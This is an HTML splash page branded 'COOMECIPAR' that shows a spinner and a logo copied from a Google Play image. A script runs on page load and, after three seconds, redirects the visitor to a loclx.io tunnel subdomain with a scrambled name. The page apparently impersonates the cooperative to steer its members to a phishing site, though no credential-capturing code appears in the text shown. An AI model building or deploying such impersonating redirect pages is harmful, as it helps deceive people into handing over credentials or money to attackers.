
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>COOMECIPAR</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(135deg, #092959, #39cbcb);
      font-family: Arial, sans-serif;
    }
    
    .loader-container {
      position: relative;
      width: 150px;
      height: 150px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    /* Loader circular con los colores personalizados */
    .circle {
      width: 100%;
      height: 100%;
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid #39cbcb;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Imagen con animación de escala y opacidad */
    .image-container {
      position: absolute;
      width: 60px;
      height: 60px;
      animation: fadeInOut 1.5s infinite alternate;
    }
    
    @keyframes fadeInOut {
      0% { opacity: 1; transform: scale(1); }
      100% { opacity: 0.5; transform: scale(1.1); }
    }
    
    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="circle"></div>
    <div class="image-container">
      <img src="https://play-lh.googleusercontent.com/vUJJg_MGgJvsm4cUM26UWKWcbVHx6yuk2YIgWf5p25c9sEylT1Ol8IvQCj6_jxs4YQg=w240-h480-rw" alt="Logo Personalizado">
    </div>
  </div>

  <script>
    // Redirección después de 3 segundos
    setTimeout(() => {
      window.location.href = "https://opsiproyectsalvadpeostelas.loclx.io/COOMECIPAR/"; // Cambia la URL de redirección según necesites
    }, 3000);
  </script>
</body>
</html>
